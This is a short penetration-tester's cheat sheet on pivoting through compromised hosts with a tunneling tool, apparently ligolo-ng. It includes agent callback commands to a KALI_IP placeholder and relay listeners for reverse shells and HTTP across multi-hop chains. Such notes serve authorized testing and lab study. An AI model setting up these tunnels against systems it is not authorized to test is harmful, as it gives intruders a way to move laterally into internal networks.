# ***Pivot***
## 1 Kali
```shell
# 1 (default listening port 11601)
sudo ./proxy -selfcert
interface_create --name "agent1"

# 2 WAIT FOR AGENT TO CONNECT THEN...
```

```shell
# 3 After Agent connects
session
<session_num>
tunnel_start --tun agent1
ifconfig
interface_add_route --name agent1 --route 192.168.%.0/24
```
***localhost access (If ports on target only accept localhost)***
```shell
interface_add_route --name agent1 --route 240.0.0.1/32
```

## 2 TARGET
```shell
./agent -connect KALI_IP:11601 -ignore-cert
```

# *Multiple Pivots*
***Kali -> Box 1 - Box 2 - Box 3 -> Box 4 ...***
*If **Box 2** will have an **agent** to access Box 3, than the **Box 1 agent** will need the following listeners, and so on and so forth for each subsequent boxes:*
1. _**HTTP listener** for interacting back to our Kali from Box 2_
2. _**Reverse shell listener** for Box 2 to bind to our listener for access_
3. _**Agent listener** for agent on Box 2 to reach back to our Kali_
```shell
# 1. FIRST in Kali
interface_create --name "agent2"

# 2. THEN for AGENT 1 in BOX 1
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:ANY_OPEN_PORT # http
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:ANY_OPEN_PORT # reverse
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 # agent

# 3. RUN agent 2 from Box 2 then when agent connects:
session
<session_num agent 2>
tunnel_start --tun agent2
ifconfig
interface_add_route <Box_3_SUBNET>

# https://medium.com/@issam.qsous/mastering-multi-pivot-strategies-unleashing-ligolo-ngs-power-double-triple-and-even-quadruple-dca6b24c404c
# https://medium.com/@Poiint/pivoting-with-ligolo-ng-0ca402abc3e9
```